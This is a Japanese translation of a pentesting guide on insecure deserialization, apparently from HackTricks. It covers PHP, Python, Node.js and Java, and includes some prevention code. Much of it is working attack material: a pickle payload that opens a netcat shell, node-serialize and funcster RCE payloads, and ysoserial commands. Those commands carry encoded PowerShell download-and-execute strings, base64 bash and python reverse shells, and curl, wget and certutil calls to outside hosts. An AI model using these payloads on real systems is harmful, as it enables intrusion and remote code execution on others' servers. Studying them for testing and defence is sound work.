# デシリアライズ

{{#include ../../banners/hacktricks-training.md}}

## 基本情報

**シリアライズ**は、オブジェクトを保存可能な形式に変換する方法として理解されており、オブジェクトを保存するか、通信プロセスの一部として送信する意図があります。この技術は、オブジェクトが後で再作成できるように、その構造と状態を維持するために一般的に使用されます。

**デシリアライズ**は、逆にシリアライズに対抗するプロセスです。特定の形式で構造化されたデータを取り、それをオブジェクトに再構築することを含みます。

デシリアライズは危険である可能性があります。なぜなら、**攻撃者がシリアライズされたデータを操作して有害なコードを実行させたり、オブジェクト再構築プロセス中にアプリケーションに予期しない動作を引き起こすことを許す可能性があるからです**。

## PHP

PHPでは、シリアライズおよびデシリアライズプロセス中に特定のマジックメソッドが利用されます：

- `__sleep`: オブジェクトがシリアライズされるときに呼び出されます。このメソッドは、シリアライズされるべきオブジェクトのすべてのプロパティの名前の配列を返す必要があります。保留中のデータをコミットしたり、同様のクリーンアップタスクを実行するために一般的に使用されます。
- `__wakeup`: オブジェクトがデシリアライズされるときに呼び出されます。シリアライズ中に失われた可能性のあるデータベース接続を再確立し、他の再初期化タスクを実行するために使用されます。
- `__unserialize`: オブジェクトがデシリアライズされるときに、`__wakeup`の代わりに呼び出されるメソッドです。`__wakeup`に比べてデシリアライズプロセスに対する制御が強化されます。
- `__destruct`: オブジェクトが破棄される直前またはスクリプトが終了するときに呼び出されるメソッドです。ファイルハンドルやデータベース接続を閉じるなどのクリーンアップタスクに一般的に使用されます。
- `__toString`: このメソッドは、オブジェクトを文字列として扱うことを可能にします。ファイルを読み取るためや、その中の関数呼び出しに基づく他のタスクに使用でき、オブジェクトのテキスト表現を効果的に提供します。
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
結果を見ると、オブジェクトがデシリアライズされるときに **`__wakeup`** と **`__destruct`** 関数が呼び出されることがわかります。いくつかのチュートリアルでは、属性を印刷しようとすると **`__toString`** 関数が呼び出されるとされていますが、どうやらそれは **もう起こっていない** ようです。

> [!WARNING]
> クラスに実装されている場合、**`__wakeup()`** の代わりに **`__unserialize(array $data)`** メソッドが呼び出されます。これにより、シリアライズされたデータを配列として提供することでオブジェクトをデシリアライズできます。このメソッドを使用してプロパティをデシリアライズし、デシリアライズ時に必要なタスクを実行できます。
>
> ```php
> class MyClass {
>    private $property;
>
>    public function __unserialize(array $data): void {
>        $this->property = $data['property'];
>        // デシリアライズ時に必要なタスクを実行します。
>    }
> }
> ```

説明された **PHPの例をここで読むことができます**: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/)、ここ [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) またはここ [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserial + Autoload Classes

PHPのオートロード機能を悪用して、任意のPHPファイルを読み込むことができます。

{{#ref}}
php-deserialization-+-autoload-classes.md
{{#endref}}

### 参照値のシリアライズ

何らかの理由で、他のシリアライズされた値への **参照として** 値をシリアライズしたい場合は、次のようにできます:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### `allowed_classes`を使用したPHPオブジェクトインジェクションの防止

> [!INFO]
> **PHP 7.0**で`unserialize()`の**第2引数**（`$options`配列）のサポートが追加されました。古いバージョンでは、関数はシリアライズされた文字列のみを受け入れ、どのクラスがインスタンス化されるかを制限することが不可能です。

`unserialize()`は、特に指示がない限り、シリアライズされたストリーム内で見つかった**すべてのクラス**を**インスタンス化**します。PHP 7以降、この動作は[`allowed_classes`](https://www.php.net/manual/en/function.unserialize.php)オプションで制限できます：
```php
// NEVER DO THIS – full object instantiation
$object = unserialize($userControlledData);

// SAFER – disable object instantiation completely
$object = unserialize($userControlledData, [
'allowed_classes' => false    // no classes may be created
]);

// Granular – only allow a strict white-list of models
$object = unserialize($userControlledData, [
'allowed_classes' => [MyModel::class, DateTime::class]
]);
```
もし**`allowed_classes`が省略されるか、コードがPHP < 7.0で実行される**場合、攻撃者が`__wakeup()`や`__destruct()`などのマジックメソッドを悪用するペイロードを作成できるため、呼び出しは**危険**になります。

#### 実世界の例: Everest Forms (WordPress) CVE-2025-52709

WordPressプラグイン**Everest Forms ≤ 3.2.2**は、ヘルパーラッパーで防御的になろうとしましたが、レガシーPHPバージョンを忘れていました:
```php
function evf_maybe_unserialize($data, $options = array()) {
if (is_serialized($data)) {
if (version_compare(PHP_VERSION, '7.1.0', '>=')) {
// SAFE branch (PHP ≥ 7.1)
$options = wp_parse_args($options, array('allowed_classes' => false));
return @unserialize(trim($data), $options);
}
// DANGEROUS branch (PHP < 7.1)
return @unserialize(trim($data));
}
return $data;
}
```
**PHP ≤ 7.0** をまだ実行しているサーバーでは、この2番目の分岐が管理者が悪意のあるフォーム送信を開いたときに古典的な **PHP Object Injection** につながりました。最小限のエクスプロイトペイロードは次のようになります:
```
O:8:"SomeClass":1:{s:8:"property";s:28:"<?php system($_GET['cmd']); ?>";}
```
管理者がエントリを表示すると、オブジェクトがインスタンス化され、`SomeClass::__destruct()`が実行され、任意のコードが実行される結果となりました。

**重要なポイント**
1. `unserialize()`を呼び出す際は、常に`['allowed_classes' => false]`（または厳格なホワイトリスト）を渡してください。
2. 防御ラッパーを監査してください – それらはしばしばレガシーPHPブランチを忘れがちです。
3. **PHP ≥ 7.x** へのアップグレードだけでは*不十分*です：オプションは明示的に指定する必要があります。

---

### PHPGGC (PHP用のysoserial)

[**PHPGGC**](https://github.com/ambionics/phpggc)は、PHPのデシリアライズを悪用するためのペイロードを生成するのに役立ちます。\
アプリケーションのソースコード内でデシリアライズを悪用する方法を**見つけられない場合もありますが、外部PHP拡張のコードを**悪用できるかもしれません。\
したがって、可能であれば、サーバーの`phpinfo()`を確認し、**インターネットで検索**（さらには**PHPGGCのガジェット**も）して、悪用できる可能性のあるガジェットを探してください。

### phar:// メタデータデシリアライズ

ファイルを読み取るだけでPHPコードを実行しないLFIを見つけた場合、例えば、_**file_get_contents(), fopen(), file() または file_exists(), md5_file(), filemtime() または filesize()**_**のような関数を使用している場合、**phar**プロトコルを使用して**ファイル**を**読み取る**際に発生する**デシリアライズ**を悪用しようとすることができます。\
詳細については、以下の投稿をお読みください：

{{#ref}}
../file-inclusion/phar-deserialization.md
{{#endref}}

## Python

### **Pickle**

オブジェクトがアンピクルされると、関数\_\_\_reduce\_\_\_が実行されます。\
悪用されると、サーバーはエラーを返す可能性があります。
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
以下のバイパステクニックを確認する前に、`print(base64.b64encode(pickle.dumps(P(),2)))`を使用して、Python3を実行している場合にPython2と互換性のあるオブジェクトを生成してください。

**pickle jail**からの脱出に関する詳細は、以下を確認してください：

{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

### Yaml **&** jsonpickle

以下のページでは、**yamlの不安全なデシリアライズを悪用する技術**を紹介し、**Pickle, PyYAML, jsonpickle, ruamel.yaml**のためのRCEデシリアライズペイロードを生成するために使用できるツールで締めくくります：

{{#ref}}
python-yaml-deserialization.md
{{#endref}}

### クラス汚染 (Pythonプロトタイプ汚染)

{{#ref}}
../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md
{{#endref}}

## NodeJS

### JSマジック関数

JSは、オブジェクトを作成するためだけに実行される**"マジック"関数**を持っていませんが、**`toString`**、**`valueOf`**、**`toJSON`**のように、**直接呼び出さなくても頻繁に使用される関数**があります。\
デシリアライズを悪用する場合、これらの関数を**妥協して他のコードを実行**させることができれば、呼び出されたときに任意のコードを実行することができます。

関数を直接呼び出さずに**"マジック"な方法**で呼び出すもう一つの方法は、**非同期関数**（プロミス）によって返されるオブジェクトを**妥協する**ことです。なぜなら、その**返されるオブジェクト**を**"then"という関数型のプロパティ**を持つ別の**プロミス**に**変換**すると、別のプロミスによって返されるだけで**実行される**からです。_詳細については_ [_**このリンク**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _を参照してください。_
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise((resolve) => {
console.log("hello")
resolve()
})
return p
}

async function test_then() {
const p = new Promise((then) => {
console.log("hello")
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` と `prototype` の汚染

この技術について学びたい場合は、**次のチュートリアルを参照してください**:

{{#ref}}
nodejs-proto-prototype-pollution/
{{#endref}}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

このライブラリは関数をシリアライズすることを可能にします。例:
```javascript
var y = {
rce: function () {
require("child_process").exec("ls /", function (error, stdout, stderr) {
console.log(stdout)
})
},
}
var serialize = require("node-serialize")
var payload_serialized = serialize.serialize(y)
console.log("Serialized: \n" + payload_serialized)
```
**シリアライズされたオブジェクト**は次のようになります:
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
関数がシリアライズされると、シリアライズされたオブジェクトに `_$$ND_FUNC$$_` フラグが追加されることが例に示されています。

ファイル `node-serialize/lib/serialize.js` 内で、同じフラグとそのコードの使用方法を見つけることができます。

![](<../../images/image (351).png>)

![](<../../images/image (446).png>)

最後のコードのチャンクで見られるように、**フラグが見つかった場合**、`eval` が関数をデシリアライズするために使用されるため、基本的に **ユーザー入力が `eval` 関数内で使用されています**。

しかし、**関数をシリアライズするだけでは**、それを**実行することはありません**。なぜなら、コードの一部が**`y.rce`を呼び出す必要がある**からで、これは非常に**ありそうにありません**。\
それでも、**シリアライズされたオブジェクトを修正して**、**いくつかの括弧を追加する**ことで、オブジェクトがデシリアライズされるときにシリアライズされた関数を自動的に実行させることができます。\
次のコードのチャンクで、**最後の括弧**と、`unserialize` 関数がどのように自動的にコードを実行するかに注意してください：
```javascript
var serialize = require("node-serialize")
var test = {
rce: "_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()",
}
serialize.unserialize(test)
```
以前に示したように、このライブラリは`_$$ND_FUNC$$_`の後のコードを取得し、**実行します** `eval`を使用して。したがって、**コードを自動実行する**には、**関数の作成**部分と最後の括弧を**削除し**、次の例のように**JSのワンライナーを実行する**ことができます：
```javascript
var serialize = require("node-serialize")
var test =
"{\"rce\":\"_$$ND_FUNC$$_require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })\"}"
serialize.unserialize(test)
```
ここで[**詳細情報**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)を見つけることができます。この脆弱性を悪用する方法について。

### [funcster](https://www.npmjs.com/package/funcster)

**funcster**の注目すべき点は、**標準の組み込みオブジェクト**へのアクセス不可であることです。これらはアクセス可能なスコープの外にあります。この制限により、組み込みオブジェクトのメソッドを呼び出そうとするコードの実行が妨げられ、`console.log()`や`require(something)`のようなコマンドを使用すると、`"ReferenceError: console is not defined"`のような例外が発生します。

この制限にもかかわらず、特定のアプローチを通じて、すべての標準の組み込みオブジェクトを含むグローバルコンテキストへの完全なアクセスを復元することが可能です。グローバルコンテキストを直接利用することで、この制限を回避できます。たとえば、次のスニペットを使用してアクセスを再確立できます：
```javascript
funcster = require("funcster")
//Serialization
var test = funcster.serialize(function () {
return "Hello world!"
})
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = {
__js_function: 'this.constructor.constructor("console.log(1111)")()',
}
funcster.deepDeserialize(desertest2)
var desertest3 = {
__js_function:
"this.constructor.constructor(\"require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });\")()",
}
funcster.deepDeserialize(desertest3)
```
**詳細については、[このソースを読む](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**。

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

**serialize-javascript** パッケージは、シリアル化専用に設計されており、組み込みのデシリアル化機能はありません。ユーザーはデシリアル化のための独自のメソッドを実装する責任があります。公式の例では、シリアル化されたデータをデシリアル化するために `eval` の直接使用が推奨されています：
```javascript
function deserialize(serializedJavascript) {
return eval("(" + serializedJavascript + ")")
}
```
この関数がオブジェクトをデシリアライズするために使用される場合、あなたは**簡単にそれを悪用できます**:
```javascript
var serialize = require("serialize-javascript")
//Serialization
var test = serialize(function () {
return "Hello world!"
})
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test =
"function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**詳細についてはこのソースを参照してください**[ **more information read this source**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### Cryoライブラリ

以下のページでは、このライブラリを悪用して任意のコマンドを実行する方法に関する情報を見つけることができます：

- [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
- [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

Javaでは、**デシリアライズコールバックはデシリアライズプロセス中に実行されます**。この実行は、攻撃者がこれらのコールバックをトリガーする悪意のあるペイロードを作成することで悪用され、潜在的に有害なアクションの実行につながる可能性があります。

### フィンガープリント

#### ホワイトボックス

コードベース内の潜在的なシリアライズ脆弱性を特定するには、次のものを検索します：

- `Serializable`インターフェースを実装しているクラス。
- `java.io.ObjectInputStream`、`readObject`、`readUnshared`関数の使用。

特に注意を払うべき点：

- 外部ユーザーによって定義されたパラメータで使用される`XMLDecoder`。
- `XStream`の`fromXML`メソッド、特にXStreamのバージョンが1.46以下の場合、シリアライズの問題に対して脆弱です。
- `readObject`メソッドと組み合わされた`ObjectInputStream`。
- `readObject`、`readObjectNodData`、`readResolve`、または`readExternal`などのメソッドの実装。
- `ObjectInputStream.readUnshared`。
- `Serializable`の一般的な使用。

#### ブラックボックス

ブラックボックステストでは、javaシリアライズオブジェクトを示す特定の**シグネチャまたは「マジックバイト」**を探します（`ObjectInputStream`から発生）：

- 16進パターン：`AC ED 00 05`。
- Base64パターン：`rO0`。
- `Content-type`が`application/x-java-serialized-object`に設定されたHTTPレスポンスヘッダー。
- 以前の圧縮を示す16進パターン：`1F 8B 08 00`。
- 以前の圧縮を示すBase64パターン：`H4sIA`。
- `.faces`拡張子を持つWebファイルと`faces.ViewState`パラメータ。これらのパターンをWebアプリケーションで発見した場合、[Java JSF ViewState Deserializationに関する投稿](java-jsf-viewstate-.faces-deserialization.md)に詳述されているように調査を促すべきです。
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### 脆弱性の確認

**Javaのデシリアライズ攻撃がどのように機能するかを学びたい**場合は、[**Basic Java Deserialization**](basic-java-deserialization-objectinputstream-readobject.md)、[**Java DNS Deserialization**](java-dns-deserialization-and-gadgetprobe.md)、および[**CommonsCollection1 Payload**](java-transformers-to-rutime-exec-payload.md)を確認してください。

#### ホワイトボックステスト

既知の脆弱性を持つアプリケーションがインストールされているかどうかを確認できます。
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
あなたは、**脆弱性が知られているすべてのライブラリ**を確認し、[**Ysoserial**](https://github.com/frohoff/ysoserial)が提供できるエクスプロイトを探すことができます。または、[Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json)に示されているライブラリを確認することもできます。\
さらに、[**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector)を使用して、エクスプロイト可能な可能性のあるガジェットチェーンを検索することもできます。\
**gadgetinspector**を実行する際（ビルド後）は、発生する多数の警告/エラーを気にせず、完了するまで待ってください。すべての結果は_gadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt_に書き込まれます。**gadgetinspectorはエクスプロイトを作成せず、偽陽性を示す可能性があることに注意してください**。

#### ブラックボックステスト

Burp拡張機能[**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md)を使用すると、**どのライブラリが利用可能か**（バージョンも含む）を特定できます。この情報をもとに、脆弱性をエクスプロイトするための**ペイロードを選択しやすくなる**でしょう。\
[**GadgetProbeについて詳しく学ぶにはこちらをお読みください**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**。**\
GadgetProbeは**`ObjectInputStream`のデシリアライズ**に焦点を当てています。

Burp拡張機能[**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)を使用すると、**ysoserialでエクスプロイト可能な脆弱なライブラリを特定**し、**それらをエクスプロイト**できます。\
[**Java Deserialization Scannerについて詳しく学ぶにはこちらをお読みください。**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Java Deserialization Scannerは**`ObjectInputStream`**のデシリアライズに焦点を当てています。

[**Freddy**](https://github.com/nccgroup/freddy)を使用して、**Burp**内のデシリアライズの脆弱性を**検出**することもできます。このプラグインは、**`ObjectInputStream`**に関連する脆弱性だけでなく、**Json**や**Yml**デシリアライズライブラリの脆弱性も検出します。アクティブモードでは、スリープやDNSペイロードを使用して確認を試みます。\
[**Freddyについての詳細情報はこちらで確認できます。**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**シリアライズテスト**

サーバーが使用している脆弱なライブラリを確認するだけではありません。時には、**シリアライズされたオブジェクト内のデータを変更して、いくつかのチェックをバイパスする**ことができるかもしれません（ウェブアプリ内で管理者権限を付与するかもしれません）。\
ウェブアプリケーションに送信されるJavaシリアライズオブジェクトを見つけた場合、**[**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper)を使用して、送信されるシリアライズオブジェクトをより人間が読みやすい形式で印刷することができます**。送信しているデータを知ることで、それを変更していくつかのチェックをバイパスするのが容易になります。

### **エクスプロイト**

#### **ysoserial**

Javaデシリアライズをエクスプロイトするための主なツールは[**ysoserial**](https://github.com/frohoff/ysoserial)です（[**こちらからダウンロード**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)）。また、複雑なコマンド（パイプなど）を使用できる[**ysoseral-modified**](https://github.com/pimps/ysoserial-modified)の使用も検討できます。\
このツールは**`ObjectInputStream`**のエクスプロイトに**焦点を当てている**ことに注意してください。\
私は**RCEペイロードの前に「URLDNS」ペイロードを使用することをお勧めします**。注目すべきは、「URLDNS」ペイロードが機能しない場合でも、他のRCEペイロードが機能する可能性があることです。
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
**java.lang.Runtime.exec()** のペイロードを作成する際、実行の出力をリダイレクトするために ">" や "|" のような **特殊文字** を使用することはできません。また、コマンドを実行するために "$()" を使用したり、**スペース** で区切られた **引数** をコマンドに渡すこともできません（`echo -n "hello world"` は可能ですが、`python2 -c 'print "Hello world"'` はできません）。ペイロードを正しくエンコードするために、[このウェブページ](http://www.jackson-t.ca/runtime-exec-payloads.html) を使用することができます。

次のスクリプトを使用して、Windows と Linux の **すべての可能なコード実行** ペイロードを作成し、脆弱なウェブページでテストしてください：
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

あなたは**https://github.com/pwntester/SerialKillerBypassGadgetCollection**を**ysoserialと一緒に使用して、より多くのエクスプロイトを作成することができます**。このツールに関する詳細は、ツールが発表された**トークのスライド**にあります: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next_slideshow=1)

#### marshalsec

[**marshalsec** ](https://github.com/mbechler/marshalsec)は、Javaの異なる**Json**および**Yml**シリアル化ライブラリを悪用するためのペイロードを生成するために使用できます。\
プロジェクトをコンパイルするために、私は`pom.xml`にこの**依存関係**を**追加する必要がありました**:
```html
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**Mavenをインストール**し、**プロジェクトをコンパイル**します:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

このJava JSONライブラリについての詳細は、こちらを参照してください: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Labs

- いくつかのysoserialペイロードをテストしたい場合は、**このウェブアプリを実行できます**: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
- [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Why

Javaはさまざまな目的で多くのシリアル化を使用します:

- **HTTPリクエスト**: シリアル化は、パラメータ、ViewState、クッキーなどの管理に広く使用されています。
- **RMI (Remote Method Invocation)**: Java RMIプロトコルは、シリアル化に完全に依存しており、Javaアプリケーションにおけるリモート通信の基盤です。
- **RMI over HTTP**: この方法は、Javaベースの厚いクライアントウェブアプリケーションによって一般的に使用され、すべてのオブジェクト通信にシリアル化を利用します。
- **JMX (Java Management Extensions)**: JMXは、ネットワーク上でオブジェクトを送信するためにシリアル化を利用します。
- **カスタムプロトコル**: Javaでは、標準的な慣行として生のJavaオブジェクトの送信が含まれ、今後のエクスプロイト例で示されます。

### Prevention

#### Transient objects

`Serializable`を実装するクラスは、シリアル化されるべきでないクラス内の任意のオブジェクトを`transient`として実装できます。例えば:
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### Serializableを実装する必要があるクラスのシリアル化を避ける

特定の**オブジェクトがクラス階層のために`Serializable`**インターフェースを実装しなければならないシナリオでは、意図しないデシリアライズのリスクがあります。これを防ぐために、以下のように常に例外をスローする`final`な`readObject()`メソッドを定義して、これらのオブジェクトがデシリアライズ不可能であることを確認してください。
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **Javaにおけるデシリアライズセキュリティの強化**

**`java.io.ObjectInputStream`のカスタマイズ**は、デシリアライズプロセスを保護するための実用的なアプローチです。この方法は、次の場合に適しています：

- デシリアライズコードがあなたの管理下にある。
- デシリアライズのために期待されるクラスが知られている。

**`resolveClass()`**メソッドをオーバーライドして、許可されたクラスのみにデシリアライズを制限します。これにより、明示的に許可されたクラス以外のデシリアライズが防止されます。以下の例では、デシリアライズを`Bicycle`クラスのみに制限しています：
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
